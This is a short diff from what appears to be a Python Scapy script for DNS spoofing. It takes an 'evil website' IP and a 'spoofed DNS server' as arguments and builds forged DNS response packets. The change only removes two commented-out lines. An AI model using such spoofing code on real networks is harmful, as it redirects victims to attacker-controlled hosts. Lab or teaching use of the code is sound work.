@@ -7,9 +7,6 @@ parser.add_argument("evilIP", help="IP of evil website")
 parser.add_argument("dnsserver", help="spoofed DNS server")
 args = parser.parse_args()
 
-#s = (args.evilIP)
-#d = (args.dnsserver)
-
 dns_pkt=DNS(qr=1,rd=1,qd=DNSQR(qname=args.targetsite))
 udp_pkt=UDP()
 ip_pkt=IP(src=ls)
